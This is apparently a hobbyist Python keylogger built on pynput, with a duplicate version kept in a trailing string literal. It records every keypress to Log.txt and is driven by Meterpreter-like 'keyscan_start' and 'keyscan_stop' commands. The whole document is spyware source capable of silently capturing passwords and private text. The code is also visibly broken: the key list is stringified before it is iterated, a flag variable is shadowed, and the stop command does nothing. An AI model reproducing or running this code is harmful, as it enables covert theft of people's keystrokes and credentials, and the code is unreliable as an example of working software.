import pynput
from pynput.keyboard import Key, Listener

count=0
keys=[]
result = True
def on_press(key):
	global keys, count
	result = True
	keys.append(key)
	count+=1
	print("{0} pressed".format(key))
	if(result):
		count=0
		write_file(str(keys))
		keys=[] 
			
def write_file(keys):
	with open("Log.txt","a") as f:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") >0:
				f.write("\n")
			elif k.find("Key") == -1:
				f.write(k)
	result = False


def stop():
    return False
#def on_release(key):
	#if key == Key.esc:
		#result = False
		#return result
def start():
	with Listener(on_press=on_press) as listener:
		listener.join()


terminal = input("Enter the commmand: ")


if terminal == 'keyscan_start':
    start()
elif terminal == 'keyscan_stop':
    # print("Bye")
    stop()
else:
    print("Enter a valid command")
'''
import pynput
from pynput.keyboard import Key, Listener

count=0
keys=[]
result = True
def on_press(key):
	global keys, count
	result = True
	keys.append(key)
	count+=1
	print("{0} pressed".format(key))
	if(result):
		count=0
		write_file(str(keys))
		keys=[] 
			
def write_file(keys):
	with open("Log.txt","a") as f:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") >0:
				f.write("\n")
			elif k.find("Key") == -1:
				f.write(k)
	result = False

def on_release(key):
	if key == Key.esc:
		result = False
		return result

def l():
	with Listener(on_press=on_press, on_release = on_release) as listener:
		listener.join()

'''
